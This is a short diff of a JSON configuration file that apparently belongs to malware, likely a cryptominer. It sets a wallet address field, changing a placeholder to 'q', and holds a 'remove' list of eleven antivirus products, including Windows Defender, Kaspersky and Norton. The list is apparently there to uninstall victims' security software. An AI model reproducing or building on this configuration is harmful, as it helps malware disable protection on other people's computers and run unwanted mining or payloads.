@@ -2,7 +2,7 @@
     "config": {
         "auto_reboot": "False",
         "logging": "True",
-        "wallet": "type your wallet address here",
+        "wallet": "q",
         "remove": ["avast", "avg", "bitdefender", "kaspersky", "symantec", "norton", "eset", "mcafee", "trend micro", "sophos", "windows defender"]
     }
     
